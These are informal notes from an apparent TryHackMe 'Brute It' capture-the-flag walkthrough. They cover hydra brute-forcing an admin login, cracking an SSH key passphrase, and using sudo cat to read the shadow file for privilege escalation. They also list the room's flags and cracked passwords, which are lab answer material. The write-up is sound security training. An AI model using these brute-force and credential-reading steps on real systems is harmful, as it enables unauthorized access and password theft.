### Brute It ###

export IP=10.10.196.110

found /admin

found a comment in the source code:<!-- Hey john, if you do not remember, the username is admin -->

trying hydra...could write a python script but i don't think there is a need for that because its seems a simple login and not using any kind of protection...

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.196.110 -V http-form-post '/admin:user=^USER^&pass=^PASS^:F=Username or password invalid'

# So after 2 hours (or more at this point idkkkkkkkkkkkkkkkk whats the time...... :/) guess what....

wrote a script and its all for nothinggggggggggg....the url is /admin/ and not /admin...that was the whole mistake................

[80][http-post-form] host: 10.10.149.25   login: admin   password: xavier

# Login brute force flag:
THM{brut3_f0rce_is_e4sy}

found a rsa key...../usr/share/john/ssh2john.py to convert it to forJohn...

found the passphrase:rockinroll

# User.txt:
THM{a_password_is_not_a_barrier}

did sudo -l:

found:

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat

gtfobins:LFILE = "file_to_read"

sudo cat "$LFILE"

chose the shadow file to read since the whole theme is to crack passwords:

found the root hash:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.

Password: football

# Root.txt
THM{pr1v1l3g3_3sc4l4t10n}